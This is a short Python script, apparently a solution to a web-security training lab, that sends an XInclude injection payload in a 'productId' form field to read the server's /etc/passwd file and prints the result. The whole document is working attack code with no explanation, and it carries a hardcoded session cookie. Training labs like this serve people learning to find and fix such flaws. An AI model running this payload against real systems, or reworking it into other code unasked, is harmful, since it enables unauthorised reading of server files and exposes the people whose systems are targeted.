# Exploiting XInclude to retrieve files

import requests

url = "https://0a8100e00393540cc046f3fa00a4002c.web-security-academy.net/product/stock"

cookies = {
	"session": "GxMjVrzrEQklESetbMA0jhJkI1UoBICi"
}

XPATH_PAYLOAD = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
"""

payload = {
	"productId": XPATH_PAYLOAD,
	"storeId": "1"
}

r = requests.post(url, data=payload, cookies=cookies)

print(r.text)